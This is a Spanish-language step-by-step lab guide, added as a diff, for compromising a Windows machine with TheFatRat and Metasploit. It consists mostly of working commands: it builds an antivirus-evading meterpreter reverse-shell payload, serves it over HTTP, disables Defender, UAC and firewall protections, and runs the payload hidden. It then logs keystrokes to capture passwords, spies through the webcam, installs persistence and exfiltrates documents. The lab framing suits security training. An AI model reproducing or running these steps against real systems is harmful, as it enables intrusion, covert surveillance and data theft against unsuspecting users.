@@ -1,0 +1,1246 @@
+╔══════════════════════════════════════════════════════════════════╗
+║         GUIA COMPLETA DE COMANDOS - LABORATORIO FATRAT          ║
+║        Kali Itmar (192.168.163.129)  ←→  Windows Bokul         ║
+║                  (192.168.163.130 / Hostname: IYJ)              ║
+╚══════════════════════════════════════════════════════════════════╝
+
+====================================================================
+  CONTENIDO:
+    1.  CONFIGURACION INICIAL Y VERIFICACION DE RED
+    2.  INSTALACION DE THEFATRAT EN KALI
+    3.  GENERACION DE PAYLOAD
+    4.  COMPARTIR PAYLOAD POR HTTP
+    5.  INICIAR LISTENER METASPLOIT
+    6.  CONFIGURACION DE WINDOWS VICTIMA (DEFENDER + FIREWALL)
+    7.  DESCARGA Y EJECUCION DEL PAYLOAD
+    8.  INTERACCION CON LA SESION METERPRETER
+    9.  COMANDOS POST-EXPLOTACION
+    10. LIMPIEZA DEL LABORATORIO
+    11. SOLUCION DE PROBLEMAS COMUNES
+====================================================================
+
+
+┌──────────────────────────────────────────────────────────────────┐
+│  MAQUINA: KALI ITMAR                                            │
+│  IP: 192.168.163.129                                            │
+│  USUARIO: itmar                                                 │
+└──────────────────────────────────────────────────────────────────┘
+
+====================================================================
+ 1. CONFIGURACION INICIAL Y VERIFICACION DE RED
+====================================================================
+
+  1.1  Verificar IP de Kali
+  ──────────────────────────
+  Comando:
+    ip a | grep inet
+
+  Explicación:
+    Muestra todas las interfaces de red con sus direcciones IP.
+    Busca la línea que dice "inet 192.168.163.129/24" en eth0.
+    Esa es la IP que usará Windows Bokul para conectarse.
+
+  Qué debe aparecer:
+    inet 192.168.163.129/24 brd 192.168.163.255 scope global dynamic eth0
+
+
+  1.2  Verificar conexión con Windows Bokul
+  ─────────────────────────────────────────
+  Comando:
+    ping -c 4 192.168.163.130
+
+  Explicación:
+    Envía 4 paquetes a Windows Bokul para ver si responde.
+    Si no responde, revisa que ambas máquinas estén en la misma red
+    y que el firewall de Windows permita ICMP (ping).
+
+  Qué debe aparecer:
+    64 bytes from 192.168.163.130: icmp_seq=1 ttl=128 time=1.15 ms
+    4 packets transmitted, 4 received, 0% packet loss
+
+
+  1.3  Verificar que Windows Bokul tiene los puertos necesarios
+  ─────────────────────────────────────────────────────────────
+  Comando:
+    nc -zv 192.168.163.130 4444
+
+  Explicación:
+    Verifica si el puerto 4444 está abierto en Windows Bokul.
+    Antes de ejecutar el payload, este puerto debe estar CERRADO.
+    Después de ejecutar el payload, debe estar ABIERTO (conexión activa).
+
+  Nota: Si el puerto está cerrado antes del ataque, es normal.
+
+
+====================================================================
+ 2. INSTALACION DE THEFATRAT EN KALI
+====================================================================
+
+  2.1  Actualizar sistema
+  ───────────────────────
+  Comando:
+    sudo apt update && sudo apt full-upgrade -y
+
+  Explicación:
+    Actualiza la lista de paquetes disponibles y luego actualiza
+    todos los programas instalados a su última versión.
+    Esto evita conflictos de dependencias al instalar herramientas nuevas.
+
+  Tiempo estimado: 3-5 minutos
+  Qué debe aparecer: "0 actualizados, 0 nuevos se instalarán" al final
+
+
+  2.2  Instalar dependencias
+  ──────────────────────────
+  Comando:
+    sudo apt install -y curl wget git xterm metasploit-framework \
+    default-jdk default-jre mingw-w64 python3-pip ruby upx-ucl \
+    apache2 gnome-screenshot netcat-openbsd
+
+  Explicación:
+    Instala todos los programas necesarios para que TheFatRat funcione:
+      - curl/wget:       Descargar archivos desde internet
+      - git:             Clonar repositorios de GitHub
+      - xterm:           Terminal para menus interactivos
+      - metasploit:      Framework de explotación (MSFvenom + MSFconsole)
+      - default-jdk/jre: Java para compilar payloads Android
+      - mingw-w64:       Compilador cruzado para Windows (genera .exe)
+      - python3-pip:     Gestor de paquetes de Python
+      - ruby:            Lenguaje en el que está escrito TheFatRat
+      - upx-ucl:         Comprimidor de ejecutables (reduce tamaño)
+      - apache2:         Servidor web opcional
+      - gnome-screenshot: Para tomar capturas de pantalla
+
+  Tiempo estimado: 5-10 minutos
+
+
+  2.3  Clonar TheFatRat
+  ─────────────────────
+  Comando:
+    cd /opt
+    sudo git clone --depth=1 https://github.com/screetsec/TheFatRat.git
+
+  Explicación:
+    Descarga el repositorio de TheFatRat desde GitHub.
+    --depth=1 significa que solo descarga la última versión (sin historial).
+    Se instala en /opt/ (directorio estándar para programas opcionales).
+
+  Qué debe aparecer:
+    "Clonando en '/opt/TheFatRat'... listo."
+
+
+  2.4  Dar permisos de ejecución
+  ──────────────────────────────
+  Comando:
+    cd /opt/TheFatRat
+    sudo chmod +x setup.sh fatrat backdoor_apk powerfull.sh chk_tools
+
+  Explicación:
+    Convierte los scripts en programas ejecutables.
+    Sin esto, no podrías ejecutar ./fatrat ni los otros scripts.
+
+
+  2.5  Instalar gems de Ruby
+  ──────────────────────────
+  Comando:
+    sudo gem install --no-document bundler winrm winrm-fs colorize
+
+  Explicación:
+    Instala las librerías de Ruby que necesita TheFatRat:
+      - bundler:    Gestor de dependencias de Ruby
+      - winrm:      Conexión remota a Windows (WinRM)
+      - winrm-fs:   Sistema de archivos sobre WinRM
+      - colorize:   Colores en la terminal
+
+  Nota: Si sale "Successfully installed", está correcto.
+
+
+  2.6  Verificar herramientas instaladas
+  ──────────────────────────────────────
+  Comando:
+    cd /opt/TheFatRat
+    bash ./chk_tools
+
+  Explicación:
+    Ejecuta el verificador de herramientas de TheFatRat.
+    Revisa si todos los programas necesarios están instalados.
+    Cada línea con [✔] significa que esa herramienta está lista.
+    Si alguna sale [x], se puede instalar manualmente.
+
+  Qué debe aparecer:
+    La mayoría de las líneas con [✔] al inicio.
+    Pueden faltar mono-mcs (no es crítico) y names (pip3 install names).
+
+
+====================================================================
+ 3. GENERACION DE PAYLOAD
+====================================================================
+
+  3.1  Crear directorio para payloads
+  ───────────────────────────────────
+  Comando:
+    mkdir -p ~/payloads
+
+  Explicación:
+    Crea la carpeta "payloads" dentro de tu directorio personal (/home/itmar/).
+    -p significa que no da error si ya existe.
+
+
+  3.2  Generar payload con MSFvenom (usando TheFatRat)
+  ────────────────────────────────────────────────────
+  Comando:
+    cd /opt/TheFatRat
+    sudo ./fatrat
+
+  Explicación:
+    Abre el menú interactivo de TheFatRat.
+    Dentro del menú, navega así:
+      1. Payload for Windows
+      1. windows/meterpreter/reverse_tcp
+      LHOST: 192.168.163.129
+      LPORT: 4444
+      Enter para opciones por defecto
+      Enter para el nombre del archivo (o escribe "payload.exe")
+
+  El payload se guarda automáticamente en /root/payload.exe
+
+
+  3.3  Generar payload con MSFvenom (directo, recomentado)
+  ────────────────────────────────────────────────────────
+  Comando:
+    cd ~/payloads
+    msfvenom -p windows/meterpreter/reverse_tcp \
+             LHOST=192.168.163.129 LPORT=4444 \
+             -e x86/shikata_ga_nai -i 5 \
+             -f exe --platform windows -a x86 \
+             -o payload.exe
+
+  Explicación DETALLADA de cada parámetro:
+    msfvenom                    → Herramienta de Metasploit para generar payloads
+    -p                          → Especifica el payload a usar
+      windows/meterpreter/      → Para sistema Windows
+      reverse_tcp               → La víctima se conecta a nosotros (reversa)
+    LHOST=192.168.163.129       → IP del atacante (Kali) - ADONDE SE CONECTA
+    LPORT=4444                  → Puerto donde Kali escucha
+    -e x86/shikata_ga_nai       → Encoder (ofuscador) para evadir antivirus
+    -i 5                        → 5 iteraciones de ofuscación (más = más difícil detectar)
+    -f exe                      → Formato de salida: ejecutable Windows
+    --platform windows          → Plataforma objetivo
+    -a x86                      → Arquitectura objetivo (32 bits para compatibilidad)
+    -o payload.exe              → Archivo de salida
+
+  Tiempo: 10-30 segundos
+  Qué debe aparecer: "[+] Successfully created payload.exe" al final
+
+
+  3.4  Verificar el payload generado
+  ──────────────────────────────────
+  Comando:
+    ls -lh ~/payloads/payload.exe
+    file ~/payloads/payload.exe
+
+  Explicación:
+    ls -lh: Muestra el tamaño del archivo (debe ser ~7-8KB sin UPX).
+    file:   Muestra el tipo de archivo (debe decir "PE32 executable" para Windows).
+
+  Qué debe aparecer:
+    -rw-r--r-- 1 root root 7.5K ... payload.exe
+    payload.exe: PE32 executable (GUI) Intel 80386, for MS Windows
+
+
+  3.5  Comprimir con UPX (reduce tamaño y evade AV)
+  ─────────────────────────────────────────────────
+  Comando (opcional):
+    upx -9 ~/payloads/payload.exe -o ~/payloads/payload_comprimido.exe
+
+  Explicación:
+    UPX comprime ejecutables sin alterar su funcionamiento.
+    -9 es el máximo nivel de compresión.
+    Algunos antivirus NO detectan payloads comprimidos con UPX.
+
+
+====================================================================
+ 4. COMPARTIR PAYLOAD POR HTTP
+====================================================================
+
+  4.1  Iniciar servidor HTTP desde Kali
+  ─────────────────────────────────────
+  Comando:
+    cd ~/payloads
+    python3 -m http.server 8000
+
+  Explicación:
+    Inicia un servidor web TEMPORAL en el puerto 8000.
+    Sirve todos los archivos de la carpeta actual (payloads/).
+    Windows Bokul podrá descargar el payload desde:
+      http://192.168.163.129:8000/payload.exe
+
+  IMPORTANTE: Deja esta TERMINAL ABIERTA mientras dure la transferencia.
+  Para detenerlo después: Ctrl + C
+
+  Nota: Si quieres ejecutarlo en segundo plano (para seguir usando la terminal):
+    cd ~/payloads && python3 -m http.server 8000 &
+    El "&" al final lo ejecuta en background.
+
+
+  4.2  Verificar que el servidor funciona
+  ──────────────────────────────────────
+  Comando (desde otra terminal de Kali):
+    curl http://localhost:8000/payload.exe -o /dev/null -w "%{http_code}"
+
+  Explicación:
+    Hace una petición de prueba al servidor local.
+    Si funciona, devuelve "200" (código HTTP de éxito).
+
+
+====================================================================
+ 5. INICIAR LISTENER METASPLOIT
+====================================================================
+
+  5.1  Iniciar listener (ABRIR UNA NUEVA TERMINAL)
+  ───────────────────────────────────────────────
+  ABRE UNA SEGUNDA TERMINAL en Kali (mantén la del servidor HTTP abierta).
+
+  Comando:
+    msfconsole -q -x '
+    use multi/handler
+    set PAYLOAD windows/meterpreter/reverse_tcp
+    set LHOST 0.0.0.0
+    set LPORT 4444
+    set ExitOnSession false
+    set SessionLogging true
+    set AutoRunScript post/windows/manage/migrate
+    exploit -j -z
+    '
+
+  Explicación DETALLADA de cada comando de Metasploit:
+    msfconsole            → Abre la consola de Metasploit
+    -q                    → Modo silencioso (menos texto)
+    -x '...'              → Ejecuta comandos al iniciar
+
+    use multi/handler     → Usa el módulo "handler" que escucha conexiones
+    set PAYLOAD           → Define el payload que espera recibir
+      windows/meterpreter/reverse_tcp  → Debe coincidir con el del payload
+
+    set LHOST 0.0.0.0     → Escucha en TODAS las interfaces de red (no solo una IP)
+    set LPORT 4444        → Puerto donde escucha (debe coincidir con el del payload)
+
+    set ExitOnSession false → No cerrar después de la primera conexión
+    set SessionLogging true  → Guardar registro de toda la sesión
+
+    set AutoRunScript     → Script que se ejecuta automáticamente al conectar
+      post/windows/manage/migrate → Migra el proceso a uno más estable
+
+    exploit -j -z         → -j: ejecutar en background (job), -z: no interactuar aún
+
+  Qué debe aparecer:
+    "Started reverse TCP handler on 0.0.0.0:4444"
+    "Exploit running as background job 0."
+
+
+  5.2  Alternativa: Guardar configuración en archivo RC
+  ─────────────────────────────────────────────────────
+  Comando:
+    cat > /tmp/listener.rc << 'EOF'
+    use multi/handler
+    set PAYLOAD windows/meterpreter/reverse_tcp
+    set LHOST 0.0.0.0
+    set LPORT 4444
+    set ExitOnSession false
+    set SessionLogging true
+    set AutoRunScript post/windows/manage/migrate
+    exploit -j -z
+    EOF
+
+    msfconsole -q -r /tmp/listener.rc
+
+  Explicación:
+    La primera parte crea un archivo de recursos (.rc) con los comandos.
+    La segunda parte ejecuta msfconsole usando ese archivo (-r).
+    Es útil si necesitas reiniciar el listener varias veces.
+
+
+====================================================================
+ 6. CONFIGURACION DE WINDOWS VICTIMA (DEFENDER + FIREWALL)
+====================================================================
+  MAQUINA: WINDOWS BOKUL
+  IP: 192.168.163.130
+  USUARIO: bokul
+  HOSTNAME: IYJ
+====================================================================
+
+  6.1  Verificar IP de Windows
+  ────────────────────────────
+  Comando (PowerShell):
+    ipconfig
+
+  Explicación:
+    Muestra la configuración de red de Windows.
+    Busca "Dirección IPv4" en "Ethernet0" o "Wi-Fi".
+    Debe ser 192.168.163.130 para que Kali pueda alcanzarla.
+
+
+  6.2  Verificar conexión con Kali
+  ────────────────────────────────
+  Comando (PowerShell):
+    ping -n 4 192.168.163.129
+
+  Explicación:
+    Envía 4 paquetes a Kali para ver si responde.
+    Si no responde: firewall de Kali bloqueando o red incorrecta.
+
+  Qué debe aparecer:
+    "Respuesta desde 192.168.163.129: bytes=32 tiempo=1ms TTL=64"
+
+
+  6.3  Desactivar Windows Defender (SOLO LABORATORIO!)
+  ───────────────────────────────────────────────────
+  IMPORTANTE: Esto desactiva la protección del equipo.
+  SOLO para laboratorio aislado. NO hacer en un equipo real.
+
+  Comando (PowerShell como ADMINISTRADOR):
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    Set-MpPreference -DisableBehaviorMonitoring $true
+    Set-MpPreference -DisableBlockAtFirstSeen $true
+    Set-MpPreference -DisableIOAVProtection $true
+    Set-MpPreference -DisableIntrusionPreventionSystem $true
+    Set-MpPreference -DisableScriptScanning $true
+    Set-MpPreference -SubmitSamplesConsent 2
+
+  Explicación de cada uno:
+    DisableRealtimeMonitoring   → Desactiva la protección en tiempo real
+    DisableBehaviorMonitoring   → Desactiva monitoreo de comportamiento sospechoso
+    DisableBlockAtFirstSeen     → No bloquea archivos no reconocidos automáticamente
+    DisableIOAVProtection       → No escanea descargas de internet
+    DisableIntrusionPreventionSystem → Desactiva prevención de intrusiones
+    DisableScriptScanning       → No escanea scripts (PowerShell, VBS)
+    SubmitSamplesConsent 2      → No envía muestras a Microsoft
+
+  Si algún comando falla: Tamper Protection está activado.
+  Solución: Abrir Seguridad de Windows → Virus y protección → Administrar configuración
+  → Apagar "Protección contra manipulaciones". Luego repetir.
+
+
+  6.4  Verificar que Defender quedó desactivado
+  ─────────────────────────────────────────────
+  Comando (PowerShell):
+    Get-MpPreference | Select-Object DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableBlockAtFirstSeen
+
+  Explicación:
+    Muestra el estado actual de las protecciones.
+    Todas deben decir "True" (desactivadas).
+
+
+  6.5  Agregar excepción para la carpeta de payloads
+  ──────────────────────────────────────────────────
+  Comando (PowerShell):
+    Add-MpPreference -ExclusionPath "C:\payloads"
+
+  Explicación:
+    Le dice a Defender que NO escanee la carpeta C:\payloads\.
+    Así no borrará el payload aunque reactive su protección.
+
+
+  6.6  Desactivar UAC (Control de Cuentas de Usuario)
+  ───────────────────────────────────────────────────
+  Comando (PowerShell ADMIN, OPCIONAL):
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Type DWord -Force
+
+  Explicación:
+    Desactiva las ventanas de "¿Estás seguro de que quieres ejecutar esto?".
+    Requiere REINICIO de Windows para que surta efecto.
+
+
+  6.7  Abrir puerto 4444 en firewall
+  ──────────────────────────────────
+  Comando (PowerShell ADMIN):
+    New-NetFirewallRule -DisplayName "LAB-FatRat-In" -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow
+    New-NetFirewallRule -DisplayName "LAB-FatRat-Out" -Direction Outbound -Protocol TCP -LocalPort 4444 -Action Allow
+
+  Explicación:
+    Crea reglas en el firewall de Windows para permitir tráfico entrante y saliente
+    en el puerto 4444 (el que usa Meterpreter).
+    La conexión es saliente desde Windows (Outbound), pero se agrega Inbound por seguridad.
+
+
+  6.8  Verificar reglas de firewall
+  ────────────────────────────────
+  Comando (PowerShell):
+    Get-NetFirewallRule -DisplayName "LAB-FatRat*" | Format-Table DisplayName, Direction, Enabled, Action
+
+  Explicación:
+    Muestra las reglas de firewall recién creadas.
+    Deben aparecer 2 reglas con Action = Allow y Enabled = True.
+
+
+====================================================================
+ 7. DESCARGA Y EJECUCION DEL PAYLOAD
+====================================================================
+
+  7.1  Crear carpeta para payloads en Windows
+  ───────────────────────────────────────────
+  Comando (PowerShell):
+    mkdir C:\payloads -Force
+
+  Explicación:
+    Crea la carpeta C:\payloads (si no existe).
+    -Force evita error si ya existe.
+
+
+  7.2  Descargar payload desde Kali
+  ─────────────────────────────────
+  Comando (PowerShell):
+    Invoke-WebRequest -Uri "http://192.168.163.129:8000/payload.exe" -OutFile "C:\payloads\payload.exe"
+
+  Explicación DETALLADA:
+    Invoke-WebRequest   → Comando de PowerShell para descargar archivos
+    -Uri                → La dirección completa del archivo en Kali
+                          http://192.168.163.129:8000/payload.exe
+                          (IP de Kali : Puerto : Nombre del archivo)
+    -OutFile            → Dónde guardar el archivo en Windows
+
+  Nota: Si falla, verifica que el servidor HTTP en Kali SIGA CORRIENDO.
+  Si no, vuelve a ejecutar: python3 -m http.server 8000 &
+
+
+  7.3  Verificar que el payload se descargó correctamente
+  ──────────────────────────────────────────────────────
+  Comando (PowerShell):
+    Get-ChildItem C:\payloads\
+    Get-FileHash C:\payloads\payload.exe
+
+  Explicación:
+    Get-ChildItem: Muestra los archivos en la carpeta (debe aparecer payload.exe).
+    Get-FileHash: Calcula el hash SHA256 del archivo para verificar integridad.
+
+
+  7.4  Ejecutar payload
+  ─────────────────────
+  Comando (PowerShell):
+    C:\payloads\payload.exe
+
+  Explicación:
+    Ejecuta el payload directamente. Verás una ventana negra que se abre y cierra
+    en menos de 1 segundo. ESO ES NORMAL. El payload se ejecutó, hizo la conexión
+    a Kali, y se cerró para no levantar sospechas.
+
+  Si en KALI ves: "Meterpreter session 1 opened" → ¡FUNCIONÓ!
+  Si no funciona: Defender bloqueó, Tamper Protection, o el puerto está mal.
+
+
+  7.5  Ejecutar payload en modo oculto (sin ventana)
+  ──────────────────────────────────────────────────
+  Comando (PowerShell, opcional):
+    Start-Process -FilePath "C:\payloads\payload.exe" -WindowStyle Hidden
+
+  Explicación:
+    Ejecuta el payload SIN mostrar ninguna ventana.
+    El usuario de Windows Bokul no verá nada.
+
+
+====================================================================
+ 8. INTERACCION CON LA SESION METERPRETER
+====================================================================
+  DESDE KALI ITMAR (en la terminal de Metasploit)
+====================================================================
+
+  8.1  Ver sesiones activas
+  ─────────────────────────
+  Comando (dentro de msfconsole):
+    sessions
+
+  Explicación:
+    Lista todas las sesiones activas de Meterpreter.
+    Si el payload funcionó, verás:
+      "Id  Name  Type                     Information                   Connection"
+      "1         meterpreter x86/windows  IYJ\bokul @ IYJ              192.168.163.129:4444 -> 192.168.163.130:56899"
+
+
+  8.2  Interactuar con la sesión
+  ──────────────────────────────
+  Comando (dentro de msfconsole):
+    sessions -i 1
+
+  Explicación:
+    -i: interactuar con la sesión número 1.
+    Cambia el prompt de "msf >" a "meterpreter >".
+    A partir de aquí, los comandos se ejecutan en Windows Bokul.
+
+
+  8.3  Información del sistema víctima
+  ────────────────────────────────────
+  Comando (dentro de meterpreter):
+    sysinfo
+
+  Explicación:
+    Muestra información detallada del sistema Windows víctima:
+      - Computer:   Nombre del equipo (IYJ)
+      - OS:         Versión de Windows (Windows 11 24H2)
+      - Architecture: x64 (64 bits)
+      - Meterpreter: x86/windows (el payload es 32 bits)
+      - Domain:     WORKGROUP (sin dominio)
+      - Logged On Users: Cuántos usuarios conectados
+
+  📸 TOMA CAPTURA AQUI (muestra que comprometiste Windows Bokul)
+
+
+  8.4  Saber qué usuario ejecutó el payload
+  ─────────────────────────────────────────
+  Comando (dentro de meterpreter):
+    getuid
+
+  Explicación:
+    Muestra el nombre de usuario que ejecutó el payload.
+    Debe decir: "Server username: IYJ\bokul"
+    Esto confirma que bokul de la máquina IYJ fue quien ejecutó el archivo.
+
+  📸 TOMA CAPTURA AQUI (evidencia del usuario)
+
+
+  8.5  Tomar captura de pantalla del escritorio víctima
+  ─────────────────────────────────────────────────────
+  Comando (dentro de meterpreter):
+    screenshot
+
+  Explicación:
+    Toma una foto del escritorio de Windows Bokul en ese momento.
+    La imagen se guarda automáticamente en Kali como archivo .jpeg.
+    Ruta típica: /home/itmar/payloads/XXXXX.jpeg
+    O en /root/ si ejecutaste msfconsole como root.
+
+  Para verla desde Kali:
+    xdg-open /home/itmar/payloads/*.jpeg
+
+  📸 TOMA CAPTURA DEL RESULTADO EN PANTALLA
+
+
+  8.6  Obtener una shell interactiva de Windows
+  ──────────────────────────────────────────────
+  Comando (dentro de meterpreter):
+    shell
+
+  Explicación:
+    Abre una terminal cmd.exe de Windows DENTRO de Kali.
+    Todo lo que escribas se ejecutará en Windows Bokul.
+    Ejemplos de comandos para ejecutar dentro de la shell:
+
+    whoami        → Muestra el usuario actual (iyj\bokul)
+    ipconfig      → Muestra IP de Windows Bokul
+    hostname      → Muestra el nombre del equipo (IYJ)
+    net user      → Lista todos los usuarios de Windows
+    dir C:\      → Lista archivos del disco C:
+    systeminfo    → Información detallada del sistema
+    tasklist      → Lista procesos ejecutándose
+    netstat -an   → Conexiones de red activas
+
+  Para volver a Meterpreter:
+    exit
+
+  📸 TOMA CAPTURA DE shell + whoami + ipconfig
+
+
+  8.7  Subir/descargar archivos
+  ──────────────────────────────
+  Comandos (dentro de meterpreter):
+    upload /home/itmar/payloads/payload.exe "C:\Users\bokul\Desktop\"
+    download "C:\Users\bokul\Documents\importante.docx" /home/itmar/exfiltrado/
+
+  Explicación:
+    upload:   Sube un archivo DESDE Kali HACIA Windows Bokul
+    download: Descarga un archivo DESDE Windows Bokul HACIA Kali
+
+  Ejemplo de exfiltración (robo de archivos):
+    download "C:\Users\bokul\Desktop\*\*" /home/itmar/exfiltrado/
+
+
+  8.8  Navegar por el sistema de archivos
+  ────────────────────────────────────────
+  Comandos (dentro de meterpreter):
+    pwd           → Muestra el directorio actual en Windows
+    ls            → Lista archivos del directorio actual
+    cd "C:\Users" → Cambia al directorio C:\Users
+    search -f *.docx  → Busca archivos .docx en todo el sistema
+    search -f *.txt   → Busca archivos .txt
+
+  Explicación:
+    Los comandos funcionan como en Linux pero sobre Windows.
+    pwd, ls, cd son iguales.
+    search busca archivos por patrón en todo el disco.
+
+
+  8.9  Comandos de sistema (ejecutar programas)
+  ─────────────────────────────────────────────
+  Comando (dentro de meterpreter):
+    execute -f cmd.exe -i
+
+  Explicación:
+    Ejecuta un programa en Windows Bokul.
+    -f: archivo a ejecutar (cmd.exe, notepad.exe, explorer.exe)
+    -i: interactivo (ver la salida)
+
+
+  8.10  Volver a msfconsole sin cerrar la sesión
+  ──────────────────────────────────────────────
+  Comando (dentro de meterpreter):
+    background
+
+  Explicación:
+    Envía la sesión actual a segundo plano.
+    Vuelves al prompt "msf >" pero la sesión sigue activa.
+    Para volver: sessions -i 1
+
+
+  8.11  Cerrar la sesión completamente
+  ────────────────────────────────────
+  Comando (dentro de meterpreter):
+    exit
+
+  Explicación:
+    Cierra la sesión de Meterpreter y mata el proceso en Windows Bokul.
+    Para salir completamente de Metasploit:
+    exit -y
+
+
+====================================================================
+ 9. COMANDOS POST-EXPLOTACION
+====================================================================
+
+  9.1  Migrar a un proceso más estable
+  ────────────────────────────────────
+  Comando (dentro de meterpreter):
+    getpid                  → Muestra el PID actual
+    ps                      → Lista procesos
+    migrate 1234            → Migra a otro proceso (PID=1234)
+
+  Explicación:
+    El payload.exe se ejecuta y termina rápido.
+    Para mantener el acceso, conviene migrar a un proceso estable como explorer.exe
+    o svchost.exe.
+    AutoRunScript post/windows/manage/migrate lo hace automático si lo configuraste.
+
+
+  9.2  Escalar privilegios (ser ADMIN)
+  ────────────────────────────────────
+  Comando (dentro de meterpreter):
+    getsystem
+
+  Explicación:
+    Intenta obtener privilegios de SYSTEM (máximo nivel en Windows).
+    Si funciona, pasarás de "bokul" a "NT AUTHORITY\SYSTEM".
+
+
+  9.3  Keylogger (registrar teclas)
+  ─────────────────────────────────
+  Comando (dentro de meterpreter):
+    keyscan_start           → Inicia el keylogger
+    keyscan_dump            → Muestra las teclas capturadas
+    keyscan_stop            → Detiene el keylogger
+
+  Explicación:
+    Registra todo lo que el usuario escribe en Windows Bokul.
+    Útil para capturar contraseñas.
+
+
+  9.4  Webcam (si tiene cámara)
+  ─────────────────────────────
+  Comando (dentro de meterpreter):
+    webcam_list             → Lista cámaras disponibles
+    webcam_snap             → Toma foto con la cámara
+    webcam_stream           → Transmite video en vivo
+
+
+  9.5  Persistencia (mantener acceso después de reinicio)
+  ──────────────────────────────────────────────────────
+  Comando (dentro de meterpreter):
+    run persistence -X -i 10 -p 4444 -r 192.168.163.129
+
+  Explicación:
+    Instala un script en Windows Bokul que se ejecuta al iniciar el sistema.
+    -X: Se ejecuta al inicio de Windows
+    -i 10: Se reconecta cada 10 segundos
+    -p 4444: Puerto de conexión
+    -r 192.168.163.129: IP de Kali
+
+  Después de esto, aunque reinicies Windows Bokul, se reconectará automáticamente.
+
+
+  9.6  Controlar escritorio (VNC)
+  ───────────────────────────────
+  Comando (dentro de meterpreter):
+    run vnc
+
+  Explicación:
+    Abre una ventana en Kali mostrando el escritorio de Windows Bokul en vivo.
+    Puedes ver lo que hace el usuario y mover el mouse.
+
+
+====================================================================
+ 10. LIMPIEZA DEL LABORATORIO
+====================================================================
+
+  10.1  En Kali: detener servidor HTTP
+  ────────────────────────────────────
+  Comando:
+    # Si lo ejecutaste en foreground: Ctrl + C
+    # Si lo ejecutaste en background:
+    pkill -f "python3 -m http.server"
+    # O:
+    killall python3
+
+  Explicación:
+    Detiene el servidor HTTP que compartió el payload.
+
+
+  10.2  En Kali: limpiar archivos temporales
+  ──────────────────────────────────────────
+  Comando:
+    rm -rf ~/payloads
+    rm -f /tmp/ataque-fatrat.log
+    rm -f /tmp/listener.rc
+    rm -rf ~/capturas-fatrat
+
+  Explicación:
+    Elimina todos los archivos generados durante el laboratorio:
+    - payloads/     → Los payloads generados
+    - /tmp/*.log    → Registros de la sesión
+    - /tmp/*.rc     → Archivos de configuración de Metasploit
+    - capturas/     → Capturas de pantalla
+
+
+  10.3  En Windows Bokul: reactivar Defender
+  ──────────────────────────────────────────
+  Comando (PowerShell ADMIN):
+    Set-MpPreference -DisableRealtimeMonitoring $false
+    Set-MpPreference -DisableBehaviorMonitoring $false
+    Set-MpPreference -DisableBlockAtFirstSeen $false
+    Set-MpPreference -DisableIOAVProtection $false
+    Set-MpPreference -DisableIntrusionPreventionSystem $false
+    Set-MpPreference -DisableScriptScanning $false
+    Set-MpPreference -SubmitSamplesConsent 1
+
+  Explicación:
+    Vuelve a activar todas las protecciones de Windows Defender.
+    IMPORTANTE: Siempre reactivar después del laboratorio.
+
+
+  10.4  En Windows Bokul: eliminar payload
+  ────────────────────────────────────────
+  Comando (PowerShell):
+    Remove-Item C:\payloads\ -Recurse -Force
+
+  Explicación:
+    Borra la carpeta completa C:\payloads\ con el payload adentro.
+
+
+  10.5  En Windows Bokul: eliminar reglas de firewall
+  ───────────────────────────────────────────────────
+  Comando (PowerShell ADMIN):
+    Remove-NetFirewallRule -DisplayName "LAB-FatRat-In"
+    Remove-NetFirewallRule -DisplayName "LAB-FatRat-Out"
+
+  Explicación:
+    Elimina las reglas de firewall que abrieron el puerto 4444.
+
+
+====================================================================
+ 11. SOLUCION DE PROBLEMAS COMUNES
+====================================================================
+
+  11.1  "Windows NO responde al ping"
+  ───────────────────────────────────
+  Solución:
+    En Windows Bokul (PowerShell ADMIN):
+      New-NetFirewallRule -DisplayName "Allow ICMP" -Protocol ICMPv4 -IcmpType 8 -Action Allow
+
+    Esto permite que Kali pueda hacer ping a Windows.
+
+
+  11.2  "El payload no se descarga (falla Invoke-WebRequest)"
+  ───────────────────────────────────────────────────────────
+  Solución:
+    1. Verifica que el servidor HTTP en Kali SIGA CORRIENDO
+       En Kali: ps aux | grep http.server
+    2. Verifica desde Kali: curl http://localhost:8000/payload.exe
+    3. Prueba con otro navegador en Windows Bokul:
+       http://192.168.163.129:8000/payload.exe
+    4. Alternativa con netcat:
+       En Kali: nc -lvp 9999 < ~/payloads/payload.exe
+       En Windows: netcat 192.168.163.129 9999 > C:\payloads\payload.exe
+
+
+  11.3  "Defender bloquea aunque lo desactivé"
+  ────────────────────────────────────────────
+  Solución:
+    Tamper Protection está activo.
+    Abrir: Seguridad de Windows → Protección contra virus y amenazas
+    → Administrar configuración → Protección contra manipulaciones → APAGAR
+    Luego repetir los comandos de desactivación.
+
+
+  11.4  "No aparece la sesión en Metasploit"
+  ───────────────────────────────────────────
+  Solución:
+    1. Verifica que el listener esté CORRIENDO en Kali
+       msf > jobs
+       Debe aparecer "Job 0: Exploit: multi/handler"
+    2. Verifica que LHOST en el payload = IP de Kali (192.168.163.129)
+    3. Verifica que LPORT = 4444 en ambos lados
+    4. Verifica que Windows Bokul pueda alcanzar Kali:
+       ping 192.168.163.129
+    5. Revisa el firewall de Windows (puerto 4444)
+
+
+  11.5  "Error: msfvenom: command not found"
+  ──────────────────────────────────────────
+  Solución:
+    Metasploit no está instalado.
+    sudo apt install metasploit-framework
+    sudo msfdb init
+
+
+  11.6  "TheFatRat no abre el menú correctamente"
+  ────────────────────────────────────────────────
+  Solución:
+    cd /opt/TheFatRat
+    sudo rm -rf logs/ temp/
+    sudo bash ./fatrat
+
+
+  11.7  "Error: can't find the Xterm"
+  ───────────────────────────────────
+  Solución:
+    sudo apt install xterm
+
+
+  11.8  "El payload.exe pesa 0 bytes o está vacío"
+  ────────────────────────────────────────────────
+  Solución:
+    msfvenom falló. Reintenta:
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.163.129 LPORT=4444 -f exe -o ~/payloads/payload.exe
+    (sin encoders, primero prueba sin ofuscación)
+
+
+====================================================================
+  RESUMEN DE CAPTURAS RECOMENDADAS (18 total)
+====================================================================
+
+  En KALI ITMAR (10 capturas):
+  ────────────────────────────
+  CAP 1:  ping -c 4 192.168.163.130    (Conexión con Windows)
+  CAP 2:  ip a | grep inet             (IP de Kali)
+  CAP 3:  sudo bash ./chk_tools        (Herramientas verificadas)
